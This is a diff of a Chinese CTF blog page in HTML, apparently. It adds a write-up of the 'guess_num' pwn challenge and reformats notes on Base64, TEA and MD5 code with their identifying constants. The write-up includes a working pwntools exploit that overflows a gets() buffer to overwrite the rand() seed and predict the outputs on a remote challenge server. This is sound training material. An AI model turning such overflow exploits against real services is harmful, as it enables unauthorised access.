@@ -316,6 +316,62 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             </figure>
 
 <p>得到flag:cyberpeace{d35672c5e758a40ea0c05f6dbbe77015}</p>
+<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>老样子 查保护 看位数</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H1dcd4e82cae14e17b2130dbecfbab142m.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>保护开得很全… 先跑一下 先是输入名字 然后输出自己猜的数…果断GG掉了…那载入IDA吧…</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/H9f1db03916794d03b4ed742e914b8381S.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>主函数很耿直 几乎没有跳转 跟进sub_C3E看下 发现就是cat flag 那么主要就是主函数的执行了</p>
+<blockquote>
+<p>刚开始菜鸡很是头疼 这个随机数怎么搞定 后来了解了下rand函数的具体原理</p>
+<p>rand函数是伪随机函数 他每个”种子”对应一个固定的随机值 所以在使用rand函数之前会使用srand来随机生成一个种子</p>
+</blockquote>
+<p>仔细一看 哦吼..大胆的作者敢用gets读入..八成是溢出了..再配合srand函数的原理 很容易确定思路</p>
+<p>先是利用溢出 覆盖掉种子的值 从而达到控制随机数的目的 那么就开始写脚本吧 首先确定偏移地址</p>
+<p>双击v9进入栈图 我们的目的是覆盖seed的值</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hee09e00f48d64a8da1cf875c501952fbU.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>可以简单计算出偏移量是20 那么写出脚本即可</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"53030"</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#print(elf.libc)</span>
+libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+      num<span class="token operator">=</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
+      sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'number:'</span><span class="token punctuation">)</span>
+      sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<blockquote>
+<p>这个脚本的关键就是如何在python中使用c的函数 我选择的解决方法是 使用ctypes库 </p>
+<p>这个库可以方便我们直接在程序中使用C的函数 但是我们首先要确定libc共享库的版本号 这里我是用的是ldd指令进行的查询<br>如果懒的话也可以通过在程序中使用elf.libc来获取</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hbc247d86009a4a3cac2312c5f56843149.png" alt title class>
+                <p></p>
+            </figure>
+</blockquote>
+<p>运行脚本即可</p>
+<figure class="image-box">
+                <img src="https://ae01.alicdn.com/kf/Hb3290098e42744f7ae81df295cbd19ccc.png" alt title class>
+                <p></p>
+            </figure>
+
+<p>得到flag:cyberpeace{de6b4ebe0aab9472c1dda38729fc76ef}</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -607,7 +663,7 @@ sh.interactive()</code></pre><p>运行脚本 得到flag</p>
 <blockquote>
 <p>在研究了一下午之后 写出了不完全的Base64加密算法 仅支持三位及以下的加密 代码以后会继续完善 仅供查看Base64加密的代码特征</p>
 </blockquote>
-<pre><code>#include <iostream>
+<pre class=" language-C"><code class="language-C">#include <iostream>
 using namespace std;
 
 char sy[64]=
@@ -682,9 +738,10 @@ int main(void)
     EnBase64();
     cout<<ans;
 
-} </code></pre><h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫 · 惠勒与罗杰 · 尼达姆</p>
+} </code></pre>
+<h2 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h2><p>在密码学中，微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。其设计者是剑桥大学计算机实验室的大卫 · 惠勒与罗杰 · 尼达姆</p>
 <p>Tea的实现代码比较固定 这里给出常见Tea加密的实现代码</p>
-<pre><code>#include <stdint.h>
+<pre class=" language-C"><code class="language-C">#include <stdint.h>
 
 void encrypt (uint32_t* v, uint32_t* k) {
     uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */
@@ -708,70 +765,72 @@ void decrypt (uint32_t* v, uint32_t* k) {
         sum -= delta;                                   
     }                                              /* end cycle */
     v[0]=v0; v[1]=v1;
-}</code></pre><p>Tea加密的明显特征是 ==存在一个Image Number:0x9e3779b9== </p>
+}</code></pre>
+<p>Tea加密的明显特征是 ==存在一个Image Number:0x9e3779b9== </p>
 <h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>MD5 消息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个 128 位（16 字节）的散列值（hash value），用于确保信息传输完整一致。MD5 由美国密码学家罗纳德 · 李维斯特（Ronald Linn Rivest）设计，于 1992 年公开，用以取代 MD4 算法。这套算法的程序在 RFC 1321 中被加以规范</p>
 <p>这里给出MD5实现的伪代码</p>
-<pre><code>/Note: All variables are unsigned 32 bits and wrap modulo 2^32 when calculating
-var int[64] r, k
+<pre class=" language-C"><code class="language-C">    /Note: All variables are unsigned 32 bits and wrap modulo 2^32 when calculating
+    var int[64] r, k
 
-//r specifies the per-round shift amounts
-r[ 0..15]：= {7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22} 
-r[16..31]：= {5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20}
-r[32..47]：= {4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23}
-r[48..63]：= {6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21}
+    //r specifies the per-round shift amounts
+    r[ 0..15]：= {7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22} 
+    r[16..31]：= {5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20}
+    r[32..47]：= {4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23}
+    r[48..63]：= {6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21}
 
-//Use binary integer part of the sines of integers as constants:
-for i from 0 to 63
-    k[i] := floor(abs(sin(i + 1)) × 2^32)
+    //Use binary integer part of the sines of integers as constants:
+    for i from 0 to 63
+        k[i] := floor(abs(sin(i + 1)) × 2^32)
 
-//Initialize variables:
-var int h0 := 0x67452301
-var int h1 := 0xEFCDAB89
-var int h2 := 0x98BADCFE
-var int h3 := 0x10325476
+    //Initialize variables:
+    var int h0 := 0x67452301
+    var int h1 := 0xEFCDAB89
+    var int h2 := 0x98BADCFE
+    var int h3 := 0x10325476
 
-//Pre-processing:
-append "1" bit to message
-append "0" bits until message length in bits ≡ 448 (mod 512)
-append bit length of message as 64-bit little-endian integer to message
+    //Pre-processing:
+    append "1" bit to message
+    append "0" bits until message length in bits ≡ 448 (mod 512)
+    append bit length of message as 64-bit little-endian integer to message
 
-//Process the message in successive 512-bit chunks:
-for each 512-bit chunk of message
-    break chunk into sixteen 32-bit little-endian words w[i], 0 ≤ i ≤ 15
+    //Process the message in successive 512-bit chunks:
+    for each 512-bit chunk of message
+        break chunk into sixteen 32-bit little-endian words w[i], 0 ≤ i ≤ 15
 
-//Initialize hash value for this chunk:
-var int a := h0
-var int b := h1
-var int c := h2
-var int d := h3
+    //Initialize hash value for this chunk:
+    var int a := h0
+    var int b := h1
+    var int c := h2
+    var int d := h3
 
-//Main loop:
-for i from 0 to 63
-    if 0 ≤ i ≤ 15 then
-        f := (b and c) or ((not b) and d)
-        g := i
-    else if 16 ≤ i ≤ 31
-        f := (d and b) or ((not d) and c)
-        g := (5×i + 1) mod 16
-    else if 32 ≤ i ≤ 47
-        f := b xor c xor d
-        g := (3×i + 5) mod 16
-    else if 48 ≤ i ≤ 63
-        f := c xor (b or (not d))
-        g := (7×i) mod 16
+    //Main loop:
+    for i from 0 to 63
+        if 0 ≤ i ≤ 15 then
+            f := (b and c) or ((not b) and d)
+            g := i
+        else if 16 ≤ i ≤ 31
+            f := (d and b) or ((not d) and c)
+            g := (5×i + 1) mod 16
+        else if 32 ≤ i ≤ 47
+            f := b xor c xor d
+            g := (3×i + 5) mod 16
+        else if 48 ≤ i ≤ 63
+            f := c xor (b or (not d))
+            g := (7×i) mod 16
 
-    temp := d
-    d := c
-    c := b
-    b := leftrotate((a + f + k[i] + w[g]),r[i]) + b
-    a := temp
-Next i
-//Add this chunk's hash to result so far:
-h0 := h0 + a
-h1 := h1 + b 
-h2 := h2 + c
-h3 := h3 + d
-End ForEach var int digest := h0 append h1 append h2 append h3 //(expressed as little-endian)</code></pre><p>MD5算法的显著特征就是 ==存在4个变量 h0=0x67452301 h1=0xefcdab89 h2=0x98badcfe h3=0x10325476==</p>
+        temp := d
+        d := c
+        c := b
+        b := leftrotate((a + f + k[i] + w[g]),r[i]) + b
+        a := temp
+    Next i
+    //Add this chunk's hash to result so far:
+    h0 := h0 + a
+    h1 := h1 + b 
+    h2 := h2 + c
+    h3 := h3 + d
+    End ForEach var int digest := h0 append h1 append h2 append h3 //(expressed as little-endian)</code></pre>
+<p>MD5算法的显著特征就是 ==存在4个变量 h0=0x67452301 h1=0xefcdab89 h2=0x98badcfe h3=0x10325476==</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
